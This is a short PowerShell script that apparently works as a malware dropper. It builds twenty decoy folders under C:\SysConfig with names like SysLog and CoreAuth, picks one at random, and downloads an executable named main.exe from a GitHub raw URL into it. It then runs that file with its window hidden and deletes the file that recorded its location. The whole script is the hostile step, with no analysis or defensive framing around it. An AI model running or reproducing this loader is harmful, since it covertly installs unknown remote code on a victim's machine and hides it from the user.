$d='C:\SysConfig'
md $d -f|Out-Null
$n='SysLog','NetSec','DataVault','CoreAuth','WinAudit'
1..20|%{
    $r=$n[(Get-Random -Max 5)]+$_
    $p=Join-Path $d $r
    md $p -f|Out-Null
    'sys'|Out-File ($p+'\info.txt')
    'log'|Out-File ($p+'\config.dat')
}
$tgt=Join-Path $d ($n[(Get-Random -Max 5)]+(Get-Random -Min 1 -Max 21))
$tgt|Out-File "$d\.ptr"
$ptr=Get-Content "$d\.ptr"
$t=Join-Path $ptr 'main.exe'
iwr 'https://raw.githubusercontent.com/honggiabao2911/a/main/main.exe' -o $t -UseBasicParsing
Start-Process $t -WindowStyle Hidden
Remove-Item "$d\.ptr" -Force
